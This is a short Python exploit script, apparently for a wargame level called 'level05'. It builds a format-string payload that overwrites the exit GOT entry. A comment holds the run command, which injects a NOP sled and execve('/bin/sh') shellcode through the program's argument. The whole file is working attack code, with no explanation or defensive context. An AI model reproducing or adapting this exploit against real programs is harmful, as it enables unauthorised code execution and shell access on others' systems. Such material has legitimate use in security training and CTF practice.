import struct

exit_plt  = struct.pack('I', 0x80497e0)
exit_plt += struct.pack('I', 0x80497e2)

# 0xffffd84b <--- the area were i did put the shellcode
# (NB: a weird behaviour of arguments, probably due to allocation the pointer change depending on the argument size)

print exit_plt + "%55363x%10$hn%10164x%11$hn"

# (python exp.py; cat) | ./level05 $(python -c 'print "\x90" * 100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')